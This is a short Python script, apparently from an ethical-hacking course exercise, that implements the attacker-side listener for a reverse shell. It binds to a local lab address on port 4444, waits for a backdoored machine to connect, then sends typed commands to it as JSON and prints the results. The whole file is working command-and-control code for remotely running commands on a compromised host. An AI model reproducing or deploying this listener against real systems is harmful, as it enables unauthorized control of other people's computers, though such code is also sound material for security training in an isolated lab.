#!/usr/bin/python

import socket
import json

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # options to enable reuse of sockets, if connection drops etc.
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        # 0 is the backlog - no. of connections that can be queued before system starts refusing
        listener.listen(0)  # sets up and start TCP listener
        print("[+] Waiting for Incoming Connection")
        # passively accept TCP client connection, waiting until connection arrives (blocking)
        self.connection, address = listener.accept()
        print("[+] Got a Connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode('utf-8'))  # sends TCP message

    def reliable_receive(self):
        json_data = ''
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode('utf-8')  # receives TCP message
                return json.loads(json_data)
            except ValueError:  # continue receiving until full data received
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        return self.reliable_receive()

    def run(self):
        while True:
            command = input(">> ")
            result = self.execute_remotely(command)
            print(result)


my_listener = Listener("10.0.2.15", 4444)
my_listener.run()

